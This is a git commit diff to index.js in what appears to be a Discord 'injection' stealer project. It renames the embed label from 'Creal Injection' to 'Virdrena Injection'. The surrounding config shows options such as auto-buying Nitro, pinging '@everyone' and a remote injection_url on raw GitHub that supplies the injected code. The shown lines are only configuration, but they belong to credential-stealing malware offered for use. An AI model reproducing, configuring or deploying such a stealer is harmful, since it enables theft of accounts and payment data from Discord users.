ae3d1066002e05e91156e3fcbbd1ee31f0df41e6
Virdrena <132110687+urwy@users.noreply.github.com>
2024-02-22 02:23:37 +0300

    Update index.js

--- index.js
+++ index.js
@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
+  embed_name: 'Virdrena Injection', 
   embed_icon: 'https://raw.githubusercontent.com/urwy/injection/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/urwy/injection/main/index.js', 
